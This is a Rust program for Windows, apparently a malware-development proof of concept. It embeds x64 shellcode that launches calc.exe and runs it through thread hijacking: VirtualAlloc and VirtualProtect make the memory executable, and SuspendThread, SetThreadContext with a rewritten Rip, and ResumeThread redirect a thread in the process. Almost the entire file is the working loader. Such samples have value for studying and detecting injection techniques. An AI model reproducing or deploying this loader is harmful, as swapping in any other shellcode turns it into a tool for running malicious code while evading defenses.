use std::{intrinsics::copy_nonoverlapping};

use winapi::{
    ctypes::c_void,
    shared::{minwindef::FALSE},
    um::{
        errhandlingapi::GetLastError,
        handleapi::INVALID_HANDLE_VALUE,
        memoryapi::{VirtualAlloc, VirtualProtect},
        processthreadsapi::{
            GetCurrentProcessId, GetCurrentThreadId, GetThreadContext, OpenThread, ResumeThread, SetThreadContext,
            SuspendThread,
        },
        synchapi::WaitForSingleObject,
        tlhelp32::{
            CreateToolhelp32Snapshot, Thread32First, Thread32Next,
            TH32CS_SNAPTHREAD, THREADENTRY32,
        },
        winnt::{
            CONTEXT, CONTEXT_FULL, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
            THREAD_ALL_ACCESS,
        },
    },
};

const BUF: &[u8] = &[
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
    0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
    0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed,
    0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
    0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
    0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48,
    0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1,
    0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
    0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
    0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a,
    0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
    0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b,
    0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
    0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47,
    0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e,
    0x65, 0x78, 0x65, 0x00,
];

fn get_thread_handle(
    main_thread_id: *const u32,
    thread_id: &mut u32,
    thread_handle: &mut *mut c_void,
) -> bool {
    unsafe {
        let process_id = GetCurrentProcessId();
        let mut snaphost_handle = std::ptr::null_mut();
        let mut thread_entry: THREADENTRY32 = std::mem::zeroed();

        thread_entry.dwSize = std::mem::size_of::<THREADENTRY32>() as u32;

        snaphost_handle = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

        if snaphost_handle == INVALID_HANDLE_VALUE {
            println!(
                "[-] CreateToolhelp32Snapshot failed with error: {}",
                GetLastError()
            );
            return false;
        }

        if Thread32First(snaphost_handle, &mut thread_entry) == 0 {
            println!("[-] Thread32First failed with error: {}", GetLastError());
            return false;
        }

        loop {
            if thread_entry.th32OwnerProcessID == process_id
                && thread_entry.th32ThreadID != *main_thread_id
            {
                *thread_id = thread_entry.th32ThreadID;

                *thread_handle = OpenThread(THREAD_ALL_ACCESS, FALSE, thread_entry.th32ThreadID);

                if (*thread_handle).is_null() {
                    println!("[-] OpenThread failed with error: {}", GetLastError());
                    return false;
                }
            }

            if Thread32Next(snaphost_handle, &mut thread_entry) == 0 {
                if GetLastError() != 18 {
                    // ERROR_NO_MORE_FILES
                    println!("[-] Thread32Next failed with error: {}", GetLastError());
                    return false;
                }
                break;
            }
        }
    }

    return true;
}

fn hijack_thread(thread_handle: *mut c_void, paddress: *const c_void) -> bool {
    unsafe {
        let mut ctx: CONTEXT = std::mem::zeroed();
        ctx.ContextFlags = CONTEXT_FULL;

        SuspendThread(thread_handle);

        if GetThreadContext(thread_handle, &mut ctx) == 0 {
            println!("[-] GetThreadContext failed with error: {}", GetLastError());
            return false;
        }

        ctx.Rip = paddress as u64;

        if SetThreadContext(thread_handle, &ctx) == 0 {
            println!("[-] SetThreadContext failed with error: {}", GetLastError());
            return false;
        }

        if ResumeThread(thread_handle) == 0 {
            println!("[-] ResumeThread failed with error: {}", GetLastError());
            return false;
        }

        WaitForSingleObject(thread_handle, 0xFFFFFFFF);
    }

    return true;
}

fn pause() {
    println!("\nPress Enter to continue...");
    let mut input = String::new();
    std::io::stdin().read_line(&mut input).unwrap();
}

#[allow(deprecated)]
fn main() {
    let main_thread_id = unsafe { GetCurrentThreadId() };
    let mut thread_id: u32 = 0;
    let mut thread_handle: *mut c_void = std::ptr::null_mut();

    if get_thread_handle(&main_thread_id, &mut thread_id, &mut thread_handle) {
        println!("[+] Thread handle obtained successfully!");
        println!("Thread ID: {}", thread_id);
        println!("Thread Handle: {:?}", thread_handle);
    } else {
        println!("[-] Failed to obtain thread handle.");
    }

    unsafe {
        let paddress = VirtualAlloc(
            std::ptr::null_mut(),
            BUF.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if paddress.is_null() {
            println!("[-] VirtualAlloc failed with error: {}", GetLastError());
            return;
        }

        copy_nonoverlapping(BUF.as_ptr(), paddress as *mut u8, BUF.len());

        let mut old_protect = 0;

        if VirtualProtect(paddress, BUF.len(), PAGE_EXECUTE_READ, &mut old_protect) == 0 {
            println!("[-] VirtualProtect failed with error: {}", GetLastError());
            return;
        }

        if hijack_thread(thread_handle, paddress) {
            println!("[+] Thread hijacked successfully!");
        } else {
            println!("[-] Failed to hijack thread.");
        }
    }

    pause();

}
